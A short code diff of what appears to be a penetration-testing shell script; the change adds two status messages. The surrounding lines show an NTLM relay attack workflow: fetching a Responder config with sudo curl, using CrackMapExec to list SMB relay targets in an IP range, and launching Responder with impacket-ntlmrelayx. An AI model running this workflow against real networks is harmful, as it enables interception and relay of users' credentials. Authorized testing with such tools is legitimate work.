@@ -71,9 +71,11 @@ sudo curl https://raw.githubusercontent.com/B0rk/Scripts/main/Responder_Config/n
 sleep 5
 
 #Running CrackMapExec to create a relay list
+echo -e "[${BLUE}+${RESET}] Generating relay list for the ${range} IP range."
 crackmapexec smb ${range} --gen-relay-list ~/relay_targets.txt
 
 #Launching Responder and impacket-ntlmrelayx
+echo -e "[${BLUE}+ ${RESET}] Checking for relay list."
 if [ ! -f "~/relay_targets.txt" ]; then
     echo "Relay file does not exist. Sorry about your luck..."
 else
